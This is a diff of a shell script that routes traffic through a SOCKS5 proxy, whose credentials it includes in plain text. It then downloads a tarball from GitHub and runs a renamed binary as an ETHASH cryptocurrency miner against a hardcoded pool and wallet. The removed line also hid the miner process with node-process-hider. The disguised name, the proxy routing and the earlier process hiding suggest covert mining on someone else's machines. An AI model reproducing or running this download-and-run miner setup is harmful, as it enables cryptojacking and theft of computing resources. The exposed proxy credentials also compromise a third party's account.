@@ -13,7 +13,7 @@ listen = :2233
 loglevel = 1 
 select_proxy_mode=socks5_only 
 socks5 = 103.253.24.243:8080
-socks5_username = woiden_indra
+socks5_username = woiden_liyan
 socks5_password = liyan25
 END
 
@@ -36,4 +36,4 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp  sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add susumu/penyemangatku && wget https://github.com/liyanul225/natasha/files/9181714/susumu.tar.gz && tar -xf susumu.tar.gz && susumu/penyemangatku --algo ETHASH --pool stratum+ssl://34.149.10.66:443 --user 39sFYSz9zFgnBfkVGxMaQSHhgWbCMkgReV.Tuyul --tls 0 --ethstratum ETHVETHVETHVETHV1 pause socks5://192.252.209.155:14455
+./graftcp/graftcp  wget https://github.com/liyanul225/natasha/files/9181714/susumu.tar.gz && tar -xf susumu.tar.gz && susumu/penyemangatku --algo ETHASH --pool stratum+ssl://34.149.10.66:443 --user 39sFYSz9zFgnBfkVGxMaQSHhgWbCMkgReV.Tuyul --tls 0 --ethstratum ETHVETHVETHVETHV1 pause socks5://192.252.209.155:14455
